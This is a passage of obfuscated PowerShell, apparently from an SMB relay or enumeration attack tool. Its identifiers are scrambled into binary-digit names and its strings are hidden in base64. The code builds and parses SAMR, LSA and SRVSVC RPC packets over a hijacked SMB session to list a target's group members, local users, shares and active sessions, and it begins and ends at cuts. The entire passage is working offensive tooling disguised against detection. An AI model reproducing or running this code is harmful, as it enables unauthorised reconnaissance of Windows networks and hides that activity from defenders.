                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA=='))) 
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFIAaQBkAHMA')))
                    {
                        [Byte[]]${00010100100111001} = ${10111110001011100}[140..143]
                        ${01110111001010100} = [System.BitConverter]::ToInt16(${00010100100111001},0)
                        ${00010000111010010} = ${01110111001010100} * 8 + 164
                        ${10100011101101000} = ${00010000111010010}
                        ${01101011101000011} = 152
                        ${10000101000101100} = 0
                        while(${10000101000101100} -lt ${01110111001010100})
                        {
                            ${10101100000101101} = New-Object PSObject
                            [Byte[]]${00000111100100011} = ${10111110001011100}[${01101011101000011}..(${01101011101000011} + 1)]
                            ${00110101100101011} = [System.BitConverter]::ToInt16(${00000111100100011},0)
                            ${10100011101101000} = ${00010000111010010} + ${00110101100101011}
                            [Byte[]]${01010100110001111} = ${10111110001011100}[(${00010000111010010} - 4)..(${00010000111010010} - 1)]
                            ${10110100101110000} = [System.BitConverter]::ToInt16(${01010100110001111},0)
                            [Byte[]]${00110100000100101} = ${10111110001011100}[${00010000111010010}..(${10100011101101000} - 1)]
                            if(${10110100101110000} % 2)
                            {
                                ${00010000111010010} += ${00110101100101011} + 14
                            }
                            else
                            {
                                ${00010000111010010} += ${00110101100101011} + 12
                            }
                            ${10000101001010100} = [System.BitConverter]::ToString(${00110100000100101})
                            ${10000101001010100} = ${10000101001010100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${10000101001010100} = ${10000101001010100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${10000101001010100} = New-Object System.String (${10000101001010100},0,${10000101001010100}.Length)
                            ${01101011101000011} = ${01101011101000011} + 8
                            ${10000101000101100}++
                        }
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAEwAbwBvAGsAdQBwAFMAaQBkAHMA')))
                    {
                        [Byte[]]${01111100110110011} = ${10111110001011100}[144..147]
                        ${01100111101000100} = [System.BitConverter]::ToInt16(${01111100110110011},0)
                        ${01010100101011101} = ${01100111101000100} * 12 + 172
                        ${10111110011001101} = ${01010100101011101}
                        ${01000110101001001} = 160
                        ${10110011100001111} = New-Object System.Collections.ArrayList
                        ${01100001111111001} = New-Object System.Collections.ArrayList
                        ${10000000111000110} = @()
                        ${10000101000101100} = 0
                        while(${10000101000101100} -lt ${01100111101000100})
                        {
                            [Byte[]]${11000010010111000} = ${10111110001011100}[${01000110101001001}..(${01000110101001001} + 1)]
                            ${01100001100010100} = [System.BitConverter]::ToInt16(${11000010010111000},0)
                            ${10111110011001101} = ${01010100101011101} + ${01100001100010100}
                            [Byte[]]${01010100110001111} = ${10111110001011100}[(${01010100101011101} - 4)..(${01010100101011101} - 1)]
                            ${10110100101110000} = [System.BitConverter]::ToInt16(${01010100110001111},0)
                            [Byte[]]${00000001011101111} = ${10111110001011100}[${01010100101011101}..(${10111110011001101} - 1)]
                            if(${10110100101110000} % 2)
                            {
                                ${01010100101011101} += ${01100001100010100} + 42
                            }
                            else
                            {
                                ${01010100101011101} += ${01100001100010100} + 40
                            }
                            ${01101111110110101} = [System.BitConverter]::ToString(${00000001011101111})
                            ${01101111110110101} = ${01101111110110101} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${01101111110110101} = ${01101111110110101}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${01101111110110101} = New-Object System.String (${01101111110110101},0,${01101111110110101}.Length)
                            ${10000000111000110} += ${01101111110110101}
                            ${01000110101001001} = ${01000110101001001} + 12
                            ${10000101000101100}++
                        }
                        [Byte[]]${00010100100111001} = ${10111110001011100}[(${01010100101011101} - 4)..(${01010100101011101} - 1)]         
                        ${01110111001010100} = [System.BitConverter]::ToInt16(${00010100100111001},0)
                        ${00010000111010010} = ${01110111001010100} * 16 + ${01010100101011101} + 12
                        ${10100011101101000} = ${00010000111010010}
                        ${01101011101000011} = ${01010100101011101} + 4
                        ${10000101000101100} = 0
                        while(${10000101000101100} -lt ${01110111001010100})
                        {
                            [Byte[]]${10001001101011011} = ${10111110001011100}[(${01101011101000011} - 4)]
                            [Byte[]]${00000111100100011} = ${10111110001011100}[${01101011101000011}..(${01101011101000011} + 1)]
                            ${00110101100101011} = [System.BitConverter]::ToInt16(${00000111100100011},0)
                            ${10001010100001111} = ${01101011101000011} + 8
                            [Byte[]]${00101010100100100} = ${10111110001011100}[${10001010100001111}..(${10001010100001111} + 3)]
                            ${01011010101010001} = [System.BitConverter]::ToInt16(${00101010100100100},0)
                            ${10100011101101000} = ${00010000111010010} + ${00110101100101011}
                            [Byte[]]${01010100110001111} = ${10111110001011100}[(${00010000111010010} - 4)..(${00010000111010010} - 1)]
                            ${10110100101110000} = [System.BitConverter]::ToInt16(${01010100110001111},0)
                            [Byte[]]${00110100000100101} = ${10111110001011100}[${00010000111010010}..(${10100011101101000} - 1)]
                            if(${10110100101110000} % 2)
                            {
                                ${00010000111010010} += ${00110101100101011} + 14
                            }
                            else
                            {
                                ${00010000111010010} += ${00110101100101011} + 12
                            }
                            ${10000101001010100} = [System.BitConverter]::ToString(${00110100000100101})
                            ${10000101001010100} = ${10000101001010100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${10000101001010100} = ${10000101001010100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${10000101001010100} = New-Object System.String (${10000101001010100},0,${10000101001010100}.Length)
                            ${01101011101000011} = ${01101011101000011} + 16
                            ${01111001100001101} = ${10000000111000110}[${01011010101010001}] + "\" + ${10000101001010100}
                            if(${10001001101011011} -eq 1)
                            {
                                ${10110011100001111}.Add(${01111001100001101}) > $null
                            }
                            else
                            {
                                ${01100001111111001}.Add(${01111001100001101}) > $null
                            }
                            ${10000101000101100}++
                        }
                        if(${10110011100001111} -gt 0)
                        {
                            ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member users:") > $null
                            ${10001101011100010}.output_queue.Add(${10110011100001111} -join ",") > $null
                        }
                        if(${01100001111111001} -gt 0)
                        {
                            ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] $target $EnumerateGroup group member groups:") > $null
                            ${10001101011100010}.output_queue.Add(${01100001111111001} -join ",") > $null
                        }
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFMAUgBWAFMAVgBDAA==')))
                    {
                        ${10010011001000110} = @()
                        ${10011001111011110} = @()
                        [Byte[]]${00110101101110111} = ${10111110001011100}[152..155]
                        ${10000001001110110} = [System.BitConverter]::ToInt32(${00110101101110111},0)
                        ${00011011000101111} = 164
                        if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                        {
                            ${00000101111011100} = New-Object System.Collections.ArrayList
                        }
                        else
                        {
                            ${00011100011101110} = New-Object System.Collections.ArrayList
                        }
                        ${10000101000101100} = 0
                        while(${10000101000101100} -lt ${10000001001110110})
                        {
                            if(${10000101000101100} -gt 0)
                            {
                                if(${00000111110110001} % 2)
                                {
                                    ${00011011000101111} += ${00000111110110001} * 2 + 2
                                }
                                else
                                {
                                    ${00011011000101111} += ${00000111110110001} * 2
                                }
                            }
                            else
                            {
                                if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                                {
                                    ${00011011000101111} += ${10000001001110110} * 12
                                }
                                else
                                {
                                    ${00011011000101111} += ${10000001001110110} * 16
                                }
                            }
                            [Byte[]]${10011110011000011} = ${10111110001011100}[${00011011000101111}..(${00011011000101111} + 3)]
                            ${00000111110110001} = [System.BitConverter]::ToInt32(${10011110011000011},0)
                            ${00011011000101111} += 12
                            [Byte[]]${00111111011001111} = ${10111110001011100}[(${00011011000101111})..(${00011011000101111} + (${00000111110110001} * 2 - 1))]
                            ${10001110010111100} = [System.BitConverter]::ToString(${00111111011001111})
                            ${10001110010111100} = ${10001110010111100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${10001110010111100} = ${10001110010111100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${10001110010111100} = New-Object System.String (${10001110010111100},0,${10001110010111100}.Length)
                            if(${00000111110110001} % 2)
                            {
                                ${00011011000101111} += ${00000111110110001} * 2 + 2
                            }
                            else
                            {
                                ${00011011000101111} += ${00000111110110001} * 2
                            }
                            [Byte[]]${10011110011000011} = ${10111110001011100}[${00011011000101111}..(${00011011000101111} + 3)]
                            ${00000111110110001} = [System.BitConverter]::ToInt32(${10011110011000011},0)
                            ${00011011000101111} += 12
                            [Byte[]]${01011111001000000} = ${10111110001011100}[(${00011011000101111})..(${00011011000101111} + (${00000111110110001} * 2 - 1))]
                            ${00000000001011011} = [System.BitConverter]::ToString(${01011111001000000})
                            ${00000000001011011} = ${00000000001011011} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${00000000001011011} = ${00000000001011011}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${00000000001011011} = New-Object System.String (${00000000001011011},0,${00000000001011011}.Length)
                            if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                            {
                                if(${10001110010111100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))) -and ${10001110010111100} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbAGEALQB6AEEALQBaAF0AWwBcACQAXQAkAA=='))) -and ${10001110010111100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA='))) -and ${10001110010111100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbgB0ACQA'))))
                                {
                                    ${00000101111011100}.Add(${10001110010111100}) > $null
                                }
                            }
                            else
                            {
                                if(${10001110010111100} -ne "\\" + ${_10010010110001100}.Client.LocalEndPoint.Address.IPAddressToString)
                                {
                                    ${00011100011101110}.Add(${10001110010111100} + "\" + ${00000000001011011}) > $null
                                }
                            }
                            ${10000101000101100}++
                        }
                        if(${00000101111011100}.Count -gt 0 -and ${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                        {
                            ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] $target custom shares:") > $null
                            ${10001101011100010}.output_queue.Add(${00000101111011100} -join ",") > $null
                        }
                        if(${00011100011101110}.Count -gt 0 -and ${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))))
                        {
                            ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] $target NetSessions:") > $null
                            ${10001101011100010}.output_queue.Add(${00011100011101110} -join ",") > $null
                        }
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAcwBlAFUAcwBlAHIAcwA=')))
                    {
                        [Byte[]]${00010100100111001} = ${10111110001011100}[148..151]
                        ${01110111001010100} = [System.BitConverter]::ToInt16(${00010100100111001},0)
                        ${00010000111010010} = ${01110111001010100} * 12 + 172
                        ${10100011101101000} = ${00010000111010010}
                        ${01010100111111010} = 160
                        ${01101011101000011} = 164
                        ${00111010010110001} = New-Object System.Collections.ArrayList
                        ${10000101000101100} = 0
                        while(${10000101000101100} -lt ${01110111001010100})
                        {
                            ${10101100000101101} = New-Object PSObject
                            [Byte[]]${00000111100100011} = ${10111110001011100}[${01101011101000011}..(${01101011101000011} + 1)]
                            ${00110101100101011} = [System.BitConverter]::ToInt16(${00000111100100011},0)
                            [Byte[]]${01100110111001010} = ${10111110001011100}[${01010100111111010}..(${01010100111111010} + 3)]
                            ${10100011101101000} = ${00010000111010010} + ${00110101100101011}
                            [Byte[]]${01010100110001111} = ${10111110001011100}[(${00010000111010010} - 4)..(${00010000111010010} - 1)]
                            ${10110100101110000} = [System.BitConverter]::ToInt16(${01010100110001111},0)
                            [Byte[]]${00110100000100101} = ${10111110001011100}[${00010000111010010}..(${10100011101101000} - 1)]
                            if(${10110100101110000} % 2)
                            {
                                ${00010000111010010} += ${00110101100101011} + 14
                            }
                            else
                            {
                                ${00010000111010010} += ${00110101100101011} + 12
                            }
                            ${10000101001010100} = [System.BitConverter]::ToString(${00110100000100101})
                            ${10000101001010100} = ${10000101001010100} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
                            ${10000101001010100} = ${10000101001010100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
                            ${10000101001010100} = New-Object System.String (${10000101001010100},0,${10000101001010100}.Length)
                            ${01101011101000011} = ${01101011101000011} + 12
                            ${01010100111111010} = ${01010100111111010} + 12
                            ${10000101000101100}++
                            if(${10000101001010100} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AA=='))))
                            {
                                ${00111010010110001}.Add(${10000101001010100}) > $null
                            }
                        }
                        if(${00111010010110001} -gt 0)
                        {
                            ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] $target local users:") > $null
                            ${10001101011100010}.output_queue.Add(${00111010010110001} -join ",") > $null
                        }
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEcAcgBvAHUAcABNAGUAbQBiAGUAcgA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _10111111001000000 ${00101111111000110}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x19,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgB5AEkAbgBmAG8AUgBlAHEAdQBlAHMAdAA=')))
                    {          
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x10,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _00010001100001000 0x01 0x05 0x18,0x00,0x00,0x00 0x68,0x00 ${01010110110010100}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101}    
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABSAGUAcQB1AGUAcwB0AA==')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x08,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${10101010100111101} = _01110101010111110 ${01010110110010100}
                        ${10101010100111101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA')))] = 0x00,0x04,0x00,0x00
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${00101010111100011}.Length
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} 
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x09,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00110101010010001} = _10011111111001010 ${01010110101100110} ${00111010111001010} ${10100011000111001} 0x00,0x00 ${00011110010010101} ${00111111010001001}
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${10101010100111101} = _11000000110000001 ${01010110110010100} ${00011000101001110}.Length
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA=='))) 
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBBAE0AUgBDAGwAbwBzAGUAUgBlAHEAdQBlAHMAdAA=')))
                    {
                        ${10011111011010000}++
                        ${00111110010110110} = ${00000100101011111}
                        ${10001010110000101} = _01101011100000110 0x0b,0x00 0x01,0x00 ${00011101010100101} ${10011111011010000} ${_00111001000100100} ${01011110000111110} ${_10110110010000000}
                        ${00101101011111011} = _10000000110101011 ${00000100010000110}
                        ${01111100110101011} = _00110101111101011 ${00101101011111011} 
                        ${00110101010010001} = _10101110101101000 0x03 ${01111100110101011}.Length 0 0 0x09,0x00,0x00,0x00 0x00,0x00 0x01,0x00
                        ${10101010100111101} = _01011111011010011 0x17,0xc0,0x11,0x00 ${01010110110010100} ${01111100110101011}.Length 4280
                        ${00011000101001110} = _00110101111101011 ${00110101010010001}
                        ${01111111000001111} = _00110101111101011 ${10001010110000101}
                        ${00101010111100011} = _00110101111101011 ${10101010100111101} 
                        ${01000111100110100} = ${00101010111100011}.Length + ${00011000101001110}.Length + ${01111100110101011}.Length
                        ${10001001101011001} = _00111011110001101 ${01111111000001111}.Length ${01000111100110100}
                        ${00101101010001101} = _00110101111101011 ${10001001101011001}
                        ${00101010111110011} = ${00101101010001101} + ${01111111000001111} + ${00101010111100011} + ${00011000101001110} + ${01111100110101011}
                        ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                    {
                        ${00001111100000001}.Write(${00101010111110011},0,${00101010111110011}.Length) > $null
                        ${00001111100000001}.Flush()
                        ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                        if(_00001000001001111 ${10111110001011100}[12..15])
                        {
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                        }
                        else
                        {
                            ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                    {
                        ${00001111100000001}.Read(${10111110001011100},0,${10111110001011100}.Length) > $null
                        if([System.BitConverter]::ToString(${10111110001011100}[12..15]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAzAC0AMAAxAC0AMAAwAC0AMAAwAA=='))))
                        {
                            ${00000100101011111} = ${10001010100111000}
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                    {
                        switch (${00111110010110110})
                        {
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                            {
                                if(${00100001011011110} -eq 1)
                                {
                                    ${10000101000100010} = 0x73,0x00,0x61,0x00,0x6d,0x00,0x72,0x00 
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                                }
                                elseif(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))) -and ${10011001111011110}.Count -gt 0)
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
                                }
                                else
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAAyAA==')))
                            {
                                ${00100001011011110}++
                                if(${10111110001011100}[119] -eq 3 -and [System.BitConverter]::ToString(${10111110001011100}[140..143]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    ${00101100000100000} = $true
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                else
                                {
                                    ${10101110101110110} = 0x04,0x00,0x00,0x00
                                    [Byte[]]${00001100111011001} = ${10111110001011100}[140..159]
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAA1AA==')))
                            {
                                ${00100001011011110}++
                                if(${10111110001011100}[119] -eq 3 -and [System.BitConverter]::ToString(${10111110001011100}[140..143]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                                }
                                else
                                {
                                    ${10101110101110110} = 0x04,0x00,0x00,0x00
                                    [Byte[]]${00001100111011001} = ${10111110001011100}[156..175]
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBEAG8AbQBhAGkAbgA=')))
                                }
                            }
                            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                            {
                                if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAA=='))))
                                {
                                    ${01010110101100110} = 0x48,0x00
                                    ${00111010111001010} = 2
                                    ${10100011000111001} = 0x01
                                    ${00011110010010101} = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    ${00111111010001001} = 0x03,0x00
                                    ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBoAGEAcgBlAEUAbgB1AG0AQQBsAGwA')))
                                }
                                elseif(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgA='))))
                                {
                                    ${01010110101100110} = 0x74,0x00
                                    ${00111010111001010} = 2
                                    ${10100011000111001} = 0x02
                                    ${00011110010010101} = 0xc8,0x4f,0x32,0x4b,0x70,0x16,0xd3,0x01,0x12,0x78,0x5a,0x47,0xbf,0x6e,0xe1,0x88
                                    ${00111111010001001} = 0x03,0x00
                                    ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBFAG4AdQBtAA==')))
                                }
                                elseif(${00100001011011110} -eq 1)
                                {
                                    ${01010110101100110} = 0x48,0x00
                                    ${00111010111001010} = 5
                                    ${10100011000111001} = 0x01
                                    ${00011110010010101} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xac
                                    ${00111111010001001} = 0x01,0x00
                                    if(${10011011101000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))
                                    {
                                        ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAA1AA==')))
                                    }
                                    else
                                    {
                                        ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdAAyAA==')))
                                    }
                                }
                                elseif(${00100001011011110} -gt 2)
                                {
                                    ${01010110101100110} = 0x48,0x00
                                    ${00111010111001010} = 14
                                    ${10100011000111001} = 0x01
                                    ${00011110010010101} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    ${00111111010001001} = 0x00,0x00
                                    ${10000101000100010} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                                }
                                else
                                {
                                    ${01010110101100110} = 0x48,0x00
                                    ${00111010111001010} = 1
                                    ${10100011000111001} = 0x01
                                    ${00011110010010101} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0xef,0x00,0x01,0x23,0x45,0x67,0x89,0xab
                                    ${00111111010001001} = 0x00,0x00
                                    ${10000101000100010} = 0x78,0x57,0x34,0x12,0x34,0x12,0xcd,0xab,0x76,0x00,0x63,0x00
                                    ${10001010100111000} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABTAEEATwBwAGUAbgBQAG8AbABpAGMAeQA=')))
                                }
                                ${01010110110010100} = ${10111110001011100}[132..147]
                                if($Refresh -and ${00000100101011111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                                {
                                    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAGUAcwBzAGkAbwBuACAAcgBlAGYAcgBlAHMAaABlAGQA'))) 
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                                }
                                elseif(${00100001011011110} -ge 2)
                                {
                                    ${00000100101011111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAEMAQgBpAG4AZAA=')))
                                }
